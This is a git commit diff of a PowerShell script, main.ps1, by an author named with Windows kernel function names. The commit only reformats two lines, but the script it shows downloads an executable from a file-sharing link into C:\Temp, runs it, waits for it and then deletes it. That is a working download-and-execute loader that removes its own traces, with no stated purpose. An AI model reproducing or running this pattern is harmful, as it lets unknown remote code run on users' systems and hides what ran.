aa44604d863a2ccad646c4013474a4f463cb2399
ExEnterCriticalRegionAndAcquireSharedWaitForExclusive <134896010+NtAllocateVirtualMemoryEx@users.noreply.github.com>
2024-07-17 23:53:52 -0700

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,6 +1,5 @@
-$url="https://uploadnow.io/f/PH2RSn0"
-$outputFile="C:\Temp\ta1hdwaw0d.exe"
+$url = "https://uploadnow.io/f/PH2RSn0"
+$outputFile = "C:\Temp\ta1hdwaw0d.exe"
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 Start-Process -FilePath $outputFile -Wait
 Remove-Item -Path $outputFile
-
